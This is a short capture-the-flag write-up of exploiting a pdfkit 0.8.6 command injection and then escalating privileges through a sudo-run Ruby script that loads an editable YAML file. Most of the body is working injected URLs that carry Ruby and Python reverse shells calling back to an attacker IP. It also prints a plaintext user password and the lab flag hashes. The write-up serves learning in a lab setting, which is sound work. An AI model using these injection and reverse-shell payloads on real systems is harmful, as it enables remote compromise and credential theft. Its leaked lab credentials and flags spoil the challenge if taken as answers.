pdfkit 0.8.6 is vulnerable to command injection


setting up a python http server and using the url `http://10.10.16.15:8000/?name=#{'%20`sleep 5`'}` makes the page sleep for 5 seconds.


Trying to insert a nc and bash shell in the same space did not work.
[source for ^](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795)

``` 
http://10.10.16.15:8000/?name=#{'%20`ruby -rsocket
-e'f=TCPSocket.open("10.10.16.15",9999).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'`'}  
``` 
^ this causes a connection to be made but it is dirupted immediately. Perhaps another way of getting the ruby shell?


Looking at gtfobins,  the following command (slightly manipulated) worked:
``` 
http://10.10.16.15:8000/?name=#{'%20`ruby -rsocket -e 'c=TCPSocket.new("10.10.16.15",9999);while(  cmd=c.gets);IO.popen(cmd,"r"){|io|c.print   io.read}end'`'}
``` 
However, this shell was absolutely awful. Trying 
```
http://10.10.16.15:8000/?name=#{'%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.15",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`'}
```
instead, I got a more stable connection

cding to `~` and reading the _config_ file in the _.bundle_ directory gives the credentials:
_henry:Q3c1AqGHtoI0aXAYFH_.

SSHing into this spawns a bash shell and we can read the user.txt: e917952cd8881d6ddd96ae71978eabe6



###PRIVESC###

Looking at the sudo -l privilege of running the update.dependencies.rb, it read the dependencies.yml. I am not that well versed with yml and ruby, but I am thinking, as I can edit the dependencies.yml file, I can modify it to execute some privesc. Just not sure how to write that in Ruby, so lets find out.


From the looks of it, I think it is already trying to do tat, but fails..?

According to [this artciel](https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/) the script was executed even though it also contained the error. Therefore, changing the `git_set: "id"` to `cat /root/root.txt` got the flag:
cd1a9bfdbf3389072e363de62639d2f3